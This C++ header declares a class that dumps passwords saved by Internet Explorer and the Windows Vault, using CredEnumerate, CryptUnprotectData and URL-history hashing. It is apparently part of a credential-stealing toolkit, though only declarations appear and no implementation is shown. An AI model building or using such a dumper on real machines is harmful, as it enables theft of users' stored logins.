#pragma once

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <windows.h>
#include <WinCred.h>
#include <WinReg.h>
#include <wincrypt.h>

#include <urlhist.h>
#include "sha1.h"
#include <queue>

DEFINE_GUID(CLSID_CUrlHistory, 0x3C374A40L, 0xBAE4, 0x11CF, 0xBF, 0x7D, 0x00, 0xAA, 0x00, 0x69, 0x46, 0xEE);
#define URL_HISTORY_MAX 1024
typedef BOOL (WINAPI *typeCredEnumerate)(WCHAR *, DWORD, DWORD *, PCREDENTIALW **);
typedef VOID (WINAPI *typeCredFree)(PVOID);
typedef BOOL (WINAPI *typeCryptUnprotectData)(DATA_BLOB *, LPWSTR *, DATA_BLOB *, PVOID, PVOID, DWORD, DATA_BLOB *);

//浏览器保存密码的结构体
struct get_Iexplorer {
	wchar_t url[255];
	wchar_t user_name[255];
	wchar_t pass_name[255];

};

class CIexplorer
{
public:
	CIexplorer();
	~CIexplorer();
	int DumpIExplorer(void);
	std::queue<get_Iexplorer> pIE;

private:
	void GetHashStr(wchar_t *Password, char *HashStr);
	int GetUrlHistory(wchar_t *UrlHistory[URL_HISTORY_MAX]);
	void ParseIE7Data(DATA_BLOB *Data_blob, WCHAR *URL);
	void *HM_SafeGetProcAddress(HMODULE hModule, char *func_to_search);
	int DumpIE7(void);
	void DumpVault();


};